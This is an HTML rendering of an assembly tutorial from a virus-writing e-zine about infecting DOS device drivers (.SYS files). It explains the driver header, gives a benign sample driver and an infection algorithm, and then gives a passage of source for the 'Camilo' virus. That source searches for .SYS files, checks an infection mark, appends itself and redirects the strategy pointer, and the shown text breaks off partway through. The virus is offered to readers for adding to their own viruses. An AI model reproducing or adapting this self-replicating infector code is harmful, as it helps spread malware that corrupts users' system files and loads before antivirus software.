<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>camilo.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                         /-----------------------------\
;                                         | Xine - issue #3 - Phile 106 |</span><span class="sc0">
</span><span class="sc1">;                                         \-----------------------------/</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                     Little SYS Infection Tutorial</span><span class="sc0">
</span><span class="sc1">;                     ß ß ß ß ß ß ß ß ß ß ß ß ß ß ß</span><span class="sc0">
</span><span class="sc1">;                            ÜÛ by Int13h ÛÜ</span><span class="sc0">
</span><span class="sc1">;                               Ä Ä Ä Ä Ä</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Well,  here  we  will speak a bit about the infection of devices drivers, they</span><span class="sc0">
</span><span class="sc1">; are  really  very easy to infect. When finishing this reading you will be able</span><span class="sc0">
</span><span class="sc1">; to add infection of device drivers to your virus, then it will be more c00l :)</span><span class="sc0">
</span><span class="sc1">; A .SYS  phile,  that is, a device driver, is a bridge of communication between</span><span class="sc0">
</span><span class="sc1">; the software and hardware devices. The SYS philes are read from the CONFIG.SYS,</span><span class="sc0">
</span><span class="sc1">; they  are  loaded in an own segment without PSP and are originated at offset 0.</span><span class="sc0">
</span><span class="sc1">; They  can  be  block  or  character  devices. The structure of a device driver</span><span class="sc0">
</span><span class="sc1">; follows:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                HEADER</span><span class="sc0">
</span><span class="sc1">;                STRATEGY ROUTINE</span><span class="sc0">
</span><span class="sc1">;                INTERRUPT ROUTINE</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The  first  part  of  a  .SYS  program  is  the  header,  which  structure is:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Offset  Length    Description</span><span class="sc0">
</span><span class="sc1">; ------  ------    -----------</span><span class="sc0">
</span><span class="sc1">;  0       dd       32 bit pointer to next device driver header</span><span class="sc0">
</span><span class="sc1">;  4       dw       Attribute</span><span class="sc0">
</span><span class="sc1">;  6       dw       Pointer to strategy routine (offset)</span><span class="sc0">
</span><span class="sc1">;  8       dw       Pointer to interrupt routine (offset)</span><span class="sc0">
</span><span class="sc1">;  A       8 bytes  Name of the device</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The  first  field  is a 32 bit pointer to the device header of the next device,</span><span class="sc0">
</span><span class="sc1">; this  is  because  in  a  .SYS  file  can be concatenated various devices, and</span><span class="sc0">
</span><span class="sc1">; the  last  in  the  chain  has this relative offset of  his header filled with</span><span class="sc0">
</span><span class="sc1">; the  value  FFFF:FFFF.  The  attribute  word is used to identify if the driver</span><span class="sc0">
</span><span class="sc1">; is  a  character  device  or  a  block  one.  The  next field, has  the offset</span><span class="sc0">
</span><span class="sc1">; in   the  file  where  the  strategy  routine  is,  a  strategy  routine  must</span><span class="sc0">
</span><span class="sc1">; save  the  location  of  the  request  header  that  DOS  gives to it in ES:BX.</span><span class="sc0">
</span><span class="sc1">; The  next  field  must  hold  the  offset  of  the  interrupt  routine handler,</span><span class="sc0">
</span><span class="sc1">; which  is  the  really  working  horse of the device driver, it must interpret</span><span class="sc0">
</span><span class="sc1">; the  request  header  and  perform  the  commands  that  it  read  from  there.</span><span class="sc0">
</span><span class="sc1">; The  last  one,  is  a  8 bytes field that have the name of a character device</span><span class="sc0">
</span><span class="sc1">; or  the  number  of  units  of  a  block  device.  DOS  loads  device  drivers</span><span class="sc0">
</span><span class="sc1">; dynamically  at  boot  time,  reading  them  from the CONFIG.SYS, then a virus</span><span class="sc0">
</span><span class="sc1">; can  take  control  before  some  antiviruses.  You  could read more about SYS</span><span class="sc0">
</span><span class="sc1">; structure in the chapter 9 of  the  Programmer's Technical Reference for MSDOS</span><span class="sc0">
</span><span class="sc1">; and   the   IBM   PC,   a   very   nice   shareware  document  in  TXT  format.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Just  as  an  example,  we  will  code  a  simple  SYS  file  which displays a</span><span class="sc0">
</span><span class="sc1">; message. Here it is:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 8&lt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; SIMPLE SYS FILE, by Int13h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Compile:</span><span class="sc0">
</span><span class="sc1">;       tasm /zi /m3 stupid.asm</span><span class="sc0">
</span><span class="sc1">;       tlink /m /v stupid.obj</span><span class="sc0">
</span><span class="sc1">;       tdstrip -c stupid.exe</span><span class="sc0">
</span><span class="sc1">;       ren stupid.com stupid.sys</span><span class="sc0">
</span><span class="sc1">;       Install stupid.sys with a DEVICE command in your CONFIG.SYS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Silly_SYS</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; SYS Header</span><span class="sc0">
</span><span class="sc5">Next_Device</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0ffffffffh</span><span class="sc0">       </span><span class="sc1">; Just one device</span><span class="sc0">
</span><span class="sc5">Attribute</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">8000h</span><span class="sc0">            </span><span class="sc1">; Type: character device</span><span class="sc0">
</span><span class="sc5">Strategy</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Strategy_Routine</span><span class="sc0">
</span><span class="sc5">Interrupt</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Interrupt_Routine</span><span class="sc0">
</span><span class="sc5">NameDevice</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SillySYS'</span><span class="sc0">
  

</span><span class="sc5">Strategy_Routine</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; Save ES:BX, address of the request header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Request_Header</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Request_Header</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">


</span><span class="sc5">Interrupt_Routine</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; The hearth of the program</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">; DS=CS</span><span class="sc0">

        </span><span class="sc1">; Here, we points ES:BX to the request header</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Request_Header</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Take the command byte</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; Is 0? That means, initialization</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Go_Out</span><span class="sc0">              </span><span class="sc1">; Nope</span><span class="sc0">

        </span><span class="sc1">; Here we set the segment and ending offset of the program</span><span class="sc0">
        </span><span class="sc1">; and with a 100h we indicate to DOS that all was sucessfull</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Ending</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">010h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc1">; Display a stupid msg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Message</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">7</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">Go_Out</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">                    </span><span class="sc1">; Return</span><span class="sc0">

        </span><span class="sc5">Request_Header</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; This will hold the address passed by DOS</span><span class="sc0">
        </span><span class="sc5">Message</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ABSURD WORLD!'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc5">Ending</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Silly_SYS</span><span class="sc0">

</span><span class="sc1">; 8&lt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Well.  As  you  can  see  it  is  simple  enough. Now, we will speak about the</span><span class="sc0">
</span><span class="sc1">; infection  matter.  A  virus  can  add  itself  to  the  end of file and point</span><span class="sc0">
</span><span class="sc1">; the  Next_Device  field  (offset 0)  of  the  header  to  itself, then it will</span><span class="sc0">
</span><span class="sc1">; be  acting  like  a  normal  program,  this  is  the  way  that  Dark Angel of</span><span class="sc0">
</span><span class="sc1">; Phalcom/Skim  has  choosed,  and  you  can  read  about  it  in  the  number 9</span><span class="sc0">
</span><span class="sc1">; of   40Hex   magazine.   For   our   infection  purposes,  we  will  hook  the</span><span class="sc0">
</span><span class="sc1">; strategy  routine.  This  is  the  routine  that  grabs  the  pointer  to  the</span><span class="sc0">
</span><span class="sc1">; request   header  (ES:BX)  then  you  must  be  careful  not  changing  these</span><span class="sc0">
</span><span class="sc1">; registers,  specially  with the garbage if you are making a polymorphic virus.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Let's see:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; BEFORE INFECTION:</span><span class="sc0">
</span><span class="sc1">;                    &gt; Header (Points to Strategy Routine)</span><span class="sc0">
</span><span class="sc1">;                    &gt; Strategy Routine</span><span class="sc0">
</span><span class="sc1">;                    &gt; Interrupt Routine</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; AFTER INFECTION:</span><span class="sc0">
</span><span class="sc1">;                    &gt; Header (Points to Virus)</span><span class="sc0">
</span><span class="sc1">;                    &gt; Strategy Routine</span><span class="sc0">
</span><span class="sc1">;                    &gt; Interrupt Routine</span><span class="sc0">
</span><span class="sc1">;                    &gt; Virus</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; In others words, we will follow the next algorithm:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         1.) Open the SYS file.</span><span class="sc0">
</span><span class="sc1">;         2.) Read the header (10 bytes).</span><span class="sc0">
</span><span class="sc1">;         3.) Save in a buffer the original pointer to strategy routine.</span><span class="sc0">
</span><span class="sc1">;         4.) Move pointer to end of file (save AX value).</span><span class="sc0">
</span><span class="sc1">;         5.) Write virus there.</span><span class="sc0">
</span><span class="sc1">;         6.) Modify header, changing the pointer to the strategy routine</span><span class="sc0">
</span><span class="sc1">;             to the value in AX (file size), then it will point to virus.</span><span class="sc0">
</span><span class="sc1">;         7.) Move the pointer to the beginning.</span><span class="sc0">
</span><span class="sc1">;         8.) Write the modified header.</span><span class="sc0">
</span><span class="sc1">;        10.) Close the sucker.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; And that is all. For some comments I can be reached at Int13h@antisocial.com.</span><span class="sc0">
</span><span class="sc1">; Here,  as  example,  follows a  runtime appending SYS infector which works by</span><span class="sc0">
</span><span class="sc1">; the method of reapoiting the strategy routine. Have fun!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 8&lt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">; Camilo Virus by Int13h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; To assemble:</span><span class="sc0">
</span><span class="sc1">;           tasm camilo.asm /m3</span><span class="sc0">
</span><span class="sc1">;           tlink camilo</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Run  the program camilo.exe in a directory where there are some .SYS files.</span><span class="sc0">
</span><span class="sc1">; Generally it will hang after the infection of all the  .SYS this is because</span><span class="sc0">
</span><span class="sc1">; when it returns control to the original strategy it points to offset 0, but</span><span class="sc0">
</span><span class="sc1">; the  infected  .SYS  will  run  without  any  problem.  Install  one of the</span><span class="sc0">
</span><span class="sc1">; infected  device  drivers  in  your CONFIG.SYS as  DEVICE=infected.sys  and</span><span class="sc0">
</span><span class="sc1">; all  will  be ok.  The virus is very simple and easy to understand, this is</span><span class="sc0">
</span><span class="sc1">; a  tutorial,  remember? :)          Compile  under  TASM,  I  hate  A86! :)</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">VirusSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Heap</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Camilo</span><span class="sc0">

</span><span class="sc5">Camilo</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                 </span><span class="sc1">; mov ax,original strategy routine offset</span><span class="sc0">
        </span><span class="sc5">Vieja_Estrategica</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; Push the address, then we will jump with a RET</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">               </span><span class="sc1">; DS=CS</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">
  </span><span class="sc5">Delta</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">; Get the delta offset</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02fh</span><span class="sc0">             </span><span class="sc1">; Save original DTA</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">OriginalDTA</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">OriginalDTA</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01ah</span><span class="sc0">             </span><span class="sc1">; Set an own DTA (points to heap)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ViralDTA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04eh</span><span class="sc0">             </span><span class="sc1">; Look for all the .SYS files in the</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">; current directory</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Victims</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">PopThem</span><span class="sc0">
            
</span><span class="sc5">Verify</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03d02h</span><span class="sc0">           </span><span class="sc1">; Open the file found</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ViralDTA</span><span class="sc4">+</span><span class="sc2">01eh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03fh</span><span class="sc0">             </span><span class="sc1">; Read 10 bytes</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10d</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">             </span><span class="sc1">; SYS with .EXE header?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Check if it header has the value 0xffff</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">               </span><span class="sc1">; to see if is the only device in the file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">05700h</span><span class="sc0">           </span><span class="sc1">; Get date and time</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">Fecha</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">Hora</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00011111b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00011110b</span><span class="sc0">        </span><span class="sc1">; 30*2= 60?  Look 4 infection mark</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04202h</span><span class="sc0">           </span><span class="sc1">; Move pointer to EOF</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               
        </span><span class="sc6">cwd</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Store the original strategy routine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">Vieja_Estrategica</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc1">; Points strategy routine to virus code, at EOF (AX value)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">             </span><span class="sc1">; Append virus to file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VirusSize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Camilo</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04200h</span><span class="sc0">           </span><span class="sc1">; Pointer to the beginning</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">             </span><span class="sc1">; Write the modified header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">

